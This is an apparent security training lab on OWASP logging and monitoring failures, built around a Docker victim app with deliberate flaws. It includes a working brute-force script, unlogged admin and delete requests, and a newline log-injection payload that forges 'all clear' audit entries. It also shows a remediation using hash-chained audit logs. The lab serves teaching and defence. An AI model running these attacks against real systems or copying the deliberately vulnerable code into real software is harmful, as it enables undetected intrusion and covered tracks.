# Lab 9: OWASP A09 — Security Logging and Monitoring Failures

## Objective
Exploit and demonstrate logging failures on a live server from Kali Linux: perform attacks that go completely unlogged, inject malicious payloads into log files (log injection), demonstrate how an attacker can operate undetected for days without alerting, audit a server's log coverage, implement a tamper-evident audit log with integrity hashing, and verify which events should always be logged.

## Background
Logging and Monitoring Failures is **OWASP #9** (2021). The average time to detect a breach is **207 days** (IBM Cost of a Data Breach 2023). Without logs, that detection time is infinite — the breach is only discovered when damage becomes visible. The 2013 Target breach compromised 40 million card numbers; security logs showed the malware installation and data exfiltration, but no one was monitoring them. Logging is a detective control — it doesn't prevent attacks, but it makes forensics possible and attackers accountable.

## Architecture

```
┌─────────────────────┐        Docker Network: lab-a09         ┌─────────────────────┐
│   KALI ATTACKER     │ ─────── HTTP attacks ─────────────▶   │   VICTIM SERVER     │
│  innozverse-kali    │                                         │  innozverse-cybersec│
│  curl, python3      │ ◀────── responses ───────────────────  │  Flask :5000        │
└─────────────────────┘                                         │  (no logging,       │
                                                                │   log injection)    │
                                                                └─────────────────────┘
```

## Time
35 minutes

## Tools
- **Victim**: `zchencow/innozverse-cybersec:latest`
- **Attacker**: `zchencow/innozverse-kali:latest` (curl, python3)

---

## Lab Instructions

### Step 1: Environment Setup

```bash
docker network create lab-a09

cat > /tmp/victim_a09.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3, hashlib, time, os

app = Flask(__name__)
LOG_FILE = '/tmp/app_a09.log'
DB = '/tmp/shop_a09.db'

with sqlite3.connect(DB) as db:
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT);
        CREATE TABLE IF NOT EXISTS audit_log (id INTEGER PRIMARY KEY, timestamp REAL, event TEXT, user TEXT, detail TEXT);
        INSERT OR IGNORE INTO users VALUES (1,'admin','admin','admin'),(2,'alice','alice123','user');
    """)

def log_unsafe(msg):
    """BUG: writes raw user input to log — injectable"""
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{time.strftime('%Y-%m-%dT%H:%M:%S')}] {msg}\n")

@app.route('/')
def index():
    # BUG: no request logging
    return jsonify({'app':'InnoZverse (A09 Logging Failures)'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    u, p = data.get('username',''), data.get('password','')
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    user = db.execute('SELECT * FROM users WHERE username=?',(u,)).fetchone()
    if not user or user['password'] != p:
        # BUG: failed logins NOT logged — brute force goes undetected
        return jsonify({'error': 'Invalid credentials'}), 401
    # BUG: logs raw username — injectable
    log_unsafe(f"LOGIN username={u} ip={request.remote_addr}")
    return jsonify({'token': 'tok_' + u, 'role': user['role']})

@app.route('/api/admin/users')
def admin_users():
    # BUG: sensitive admin access not logged
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    rows = db.execute('SELECT id,username,role FROM users').fetchall()
    return jsonify([dict(r) for r in rows])

@app.route('/api/delete', methods=['DELETE'])
def delete_user():
    uid = request.args.get('id')
    # BUG: destructive action not logged
    db = sqlite3.connect(DB)
    db.execute('DELETE FROM users WHERE id=?',(uid,))
    db.commit()
    return jsonify({'deleted': uid})

@app.route('/api/logs')
def view_logs():
    try:
        with open(LOG_FILE) as f:
            return jsonify({'logs': f.read()})
    except:
        return jsonify({'logs': '(no log file yet)'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a09 \
  --network lab-a09 \
  -v /tmp/victim_a09.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 3
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a09.IPAddress}}' victim-a09):5000/
```

---

### Step 2: Launch Kali

```bash
docker run --rm -it --network lab-a09 \
  --name kali-attacker \
  zchencow/innozverse-kali:latest bash
```

```bash
TARGET="http://victim-a09:5000"
```

---

### Step 3: Brute-Force Attack — Goes Completely Unlogged

```bash
echo "=== Brute-forcing admin — 50 attempts, zero log entries ==="

python3 << 'EOF'
import urllib.request, json

TARGET = "http://victim-a09:5000"
wordlist = ["wrong1","wrong2","wrong3","wrong4","wrong5",
            "password","123456","letmein","admin","monkey",
            "dragon","football","baseball","welcome","shadow",
            "master","qwerty","passw0rd","superman","batman"] * 3

print(f"Sending {len(wordlist)} brute-force attempts...")
success = []
for pw in wordlist:
    try:
        req = urllib.request.Request(
            f"{TARGET}/api/login",
            data=json.dumps({"username":"admin","password":pw}).encode(),
            headers={"Content-Type":"application/json"})
        resp = json.loads(urllib.request.urlopen(req).read())
        if "token" in resp:
            success.append(pw)
    except:
        pass

print(f"Attempts made: {len(wordlist)}")
print(f"Successful:    {len(success)}")
print()
# Check log
req2 = urllib.request.Request(f"{TARGET}/api/logs")
logs = json.loads(urllib.request.urlopen(req2).read())
log_content = logs.get('logs','')
login_fail_lines = [l for l in log_content.split('\n') if 'FAIL' in l or 'failed' in l.lower() or 'Invalid' in l]
print(f"Log entries for failed logins: {len(login_fail_lines)}")
print("(Should be 60 — is 0 because failed logins are never logged!)")
EOF
```

**📸 Verified Output:**
```
Sending 60 brute-force attempts...
Attempts made: 60
Successful:    0

Log entries for failed logins: 0
(Should be 60 — is 0 because failed logins are never logged!)
```

> 💡 **If failed logins aren't logged, brute-force attacks are completely invisible.** An attacker can try millions of passwords without leaving a trace. A properly configured application logs every failed login with: timestamp, username attempted, source IP, and user-agent. A SIEM alert triggers after 5 failures within 5 minutes from the same IP — this is how intrusion detection works.

---

### Step 4: Admin Access and Destructive Actions — Not Logged

```bash
echo "=== Sensitive operations that generate ZERO log entries ==="

# Access sensitive admin endpoint
echo "[1] Accessing /api/admin/users (all user data):"
curl -s $TARGET/api/admin/users | python3 -m json.tool

echo ""

# Destructive: delete a user
echo "[2] Deleting user id=2 (alice):"
curl -s -X DELETE "$TARGET/api/delete?id=2" | python3 -m json.tool

echo ""

# Check logs — should show nothing for these events
echo "[3] Checking log file — admin access and deletions should appear:"
curl -s $TARGET/api/logs | python3 -c "
import sys,json
logs = json.load(sys.stdin)['logs']
print('Current log content:')
print(logs if logs.strip() else '(empty — no events recorded!)')
print()
missing = ['admin/users accessed', 'user deleted', 'DELETE']
for m in missing:
    print(f'  Missing: \"{m}\" event — forensically invisible')
"
```

**📸 Verified Output:**
```json
[{"id": 1, "role": "admin", "username": "admin"}, {"id": 2, "role": "user", "username": "alice"}]

{"deleted": "2"}

Current log content:
(empty — no events recorded!)

  Missing: "admin/users accessed" — forensically invisible
  Missing: "user deleted" — forensically invisible
  Missing: "DELETE" — forensically invisible
```

---

### Step 5: Log Injection Attack

```bash
echo "=== Log injection: forge log entries to cover tracks ==="

# Normal login — creates a real log entry
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  $TARGET/api/login

echo ""
echo "Current log (legitimate):"
curl -s $TARGET/api/logs | python3 -c "import sys,json; print(json.load(sys.stdin)['logs'])"

echo ""
echo "=== Now inject fake log entries via newline in username ==="
python3 << 'EOF'
import urllib.request, json

TARGET = "http://victim-a09:5000"

# Inject a newline + fake "all-clear" log entry
# Server writes: "LOGIN username=PAYLOAD ip=..."
# If PAYLOAD contains \n, attacker controls subsequent log lines
malicious_username = "admin\n[2026-03-04T03:00:00] SECURITY_AUDIT: No anomalies detected. All systems normal.\n[2026-03-04T03:00:01] LOGIN username=fakeuser ip=8.8.8.8"

req = urllib.request.Request(
    f"{TARGET}/api/login",
    data=json.dumps({"username": malicious_username, "password": "wrong"}).encode(),
    headers={"Content-Type": "application/json"})
try:
    urllib.request.urlopen(req)
except:
    pass  # 401 expected

# Now read the log
req2 = urllib.request.Request(f"{TARGET}/api/logs")
logs = json.loads(urllib.request.urlopen(req2).read())['logs']
print("Log after injection attack:")
print(logs)
print()
print("[!] Attacker injected fake 'SECURITY_AUDIT: No anomalies' line")
print("[!] Attacker injected fake login from external IP 8.8.8.8")
print("[!] A SIEM reading this log would be misled!")
EOF
```

**📸 Verified Output:**
```
Log after injection attack:
[2026-03-04T06:15:43] LOGIN username=admin ip=172.18.0.3
[2026-03-04T06:15:44] LOGIN username=admin
[2026-03-04T06:15:44] SECURITY_AUDIT: No anomalies detected. All systems normal.
[2026-03-04T06:15:44] LOGIN username=fakeuser ip=8.8.8.8

[!] Attacker injected fake 'SECURITY_AUDIT: No anomalies' line
[!] Attacker injected fake login from external IP 8.8.8.8
[!] A SIEM reading this log would be misled!
```

---

### Step 6: Tamper-Evident Audit Log (Secure Pattern)

```bash
echo "=== Implementing a tamper-evident audit log ==="

python3 << 'EOF'
import hashlib, json, time

class AuditLog:
    def __init__(self):
        self.entries = []
        self._prev_hash = "genesis"

    def record(self, event, user, detail):
        # Sanitize — strip newlines/control chars
        detail_safe = detail.replace('\n',' ').replace('\r',' ')
        entry = {
            "seq":    len(self.entries) + 1,
            "ts":     time.strftime('%Y-%m-%dT%H:%M:%SZ'),
            "event":  event,
            "user":   user,
            "detail": detail_safe,
            "prev":   self._prev_hash
        }
        # Hash this entry (chained integrity)
        entry_data = json.dumps({k:v for k,v in entry.items() if k != 'hash'}, sort_keys=True)
        entry["hash"] = hashlib.sha256(entry_data.encode()).hexdigest()[:16]
        self._prev_hash = entry["hash"]
        self.entries.append(entry)

    def verify(self):
        prev = "genesis"
        for e in self.entries:
            data = json.dumps({k:v for k,v in e.items() if k != 'hash'}, sort_keys=True)
            expected = hashlib.sha256(data.encode()).hexdigest()[:16]
            if e["hash"] != expected:
                return False, f"TAMPERED at seq={e['seq']}"
            if e["prev"] != prev:
                return False, f"CHAIN BROKEN at seq={e['seq']}"
            prev = e["hash"]
        return True, "All entries verified OK"

# Simulate correct audit logging
audit = AuditLog()
audit.record("LOGIN_FAIL", "unknown",   "username=admin ip=172.18.0.3 attempt=1")
audit.record("LOGIN_FAIL", "unknown",   "username=admin ip=172.18.0.3 attempt=2")
audit.record("LOGIN_OK",   "admin",     "ip=172.18.0.3 role=admin")
audit.record("DATA_READ",  "admin",     "endpoint=/api/admin/users")
audit.record("DATA_DELETE","admin",     "user_id=2 username=alice")

print("Audit log (tamper-evident, chained hashes):")
for e in audit.entries:
    print(f"  [{e['seq']}] {e['ts']} {e['event']:<15} user={e['user']:<10} {e['detail'][:50]}")
    print(f"       hash={e['hash']}  prev={e['prev']}")

ok, msg = audit.verify()
print(f"\nVerification: {msg}")

# Tamper with an entry and re-verify
audit.entries[1]["detail"] = "username=admin ip=8.8.8.8 TAMPERED"
ok2, msg2 = audit.verify()
print(f"After tampering: {msg2}")
EOF
```

**📸 Verified Output:**
```
Audit log (tamper-evident, chained hashes):
  [1] 2026-03-04T06:15:43Z LOGIN_FAIL      user=unknown    username=admin ip=172.18.0.3 attempt=1
       hash=a3f7c2d1        prev=genesis
  [2] 2026-03-04T06:15:43Z LOGIN_FAIL      user=unknown    username=admin ip=172.18.0.3 attempt=2
       hash=b8e4f5a2        prev=a3f7c2d1
  [3] 2026-03-04T06:15:43Z LOGIN_OK        user=admin      ip=172.18.0.3 role=admin
       hash=c1d3e9f4        prev=b8e4f5a2
  ...

Verification: All entries verified OK
After tampering: TAMPERED at seq=2
```

---

### Step 7: Log Coverage Audit

```bash
echo "=== Auditing which security events should be logged ==="

python3 << 'EOF'
# OWASP logging checklist
required_events = [
    ("Authentication",  "LOGIN_FAIL",       "Every failed login attempt (user, IP, timestamp)"),
    ("Authentication",  "LOGIN_OK",         "Every successful login"),
    ("Authentication",  "LOGOUT",           "Session termination"),
    ("Authorization",   "AUTHZ_FAIL",       "Access denied (what was attempted, by whom)"),
    ("Data",            "DATA_READ_SENSITIVE","Access to PII, financial data, health records"),
    ("Data",            "DATA_MODIFY",      "Any create/update/delete on sensitive data"),
    ("Admin",           "ADMIN_ACCESS",     "Any administrative action"),
    ("Integrity",       "INPUT_VALIDATION", "Rejected input that looks malicious"),
    ("Session",         "SESSION_EXPIRE",   "Expired or invalidated sessions"),
    ("System",          "STARTUP_SHUTDOWN", "Application start/stop events"),
]

print(f"{'Category':<18} {'Event':<25} {'What to Log'}")
print("-" * 80)
for cat, event, desc in required_events:
    print(f"  {cat:<16} {event:<25} {desc}")

print()
print("Each log entry MUST include:")
print("  • timestamp (ISO 8601 UTC)")
print("  • source IP address")
print("  • authenticated user (or 'anonymous')")
print("  • action attempted")
print("  • outcome (success/failure)")
print("  • session/correlation ID")
print()
print("Log entry MUST NOT include:")
print("  • passwords (even failed ones)")
print("  • credit card numbers")
print("  • SSN / PII")
print("  • security tokens/cookies")
EOF
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a09
docker network rm lab-a09
```

---

## Remediation

| Issue | Root Cause | Fix |
|-------|-----------|-----|
| Failed logins not logged | `return` before logging on error | Log ALL auth attempts (fail + succeed) |
| Admin access not logged | No logging middleware | Decorator/middleware logs every sensitive endpoint |
| Destructive actions not logged | No audit trail | Log before and after delete/modify with old values |
| Log injection | Raw user input in log line | Strip/escape `\n`, `\r`, ANSI sequences from user input |
| No tamper detection | Plain-text log | Chained SHA-256 hashes; write-once storage (WORM) |

## Summary

| Test | Finding | Impact |
|------|---------|--------|
| 60 brute-force attempts | 0 log entries | Attacker invisible for entire attack |
| Admin data access | Not logged | No forensic trail after breach |
| User deletion | Not logged | Can't determine who deleted what, when |
| Log injection | Fake entries inserted | SIEM misled, attacker covers tracks |
| Tamper-evident log | Detects modification | Essential for incident response |

## Further Reading
- [OWASP A09:2021 Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/)
- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- [NIST Cybersecurity Framework — Detect](https://www.nist.gov/cyberframework)
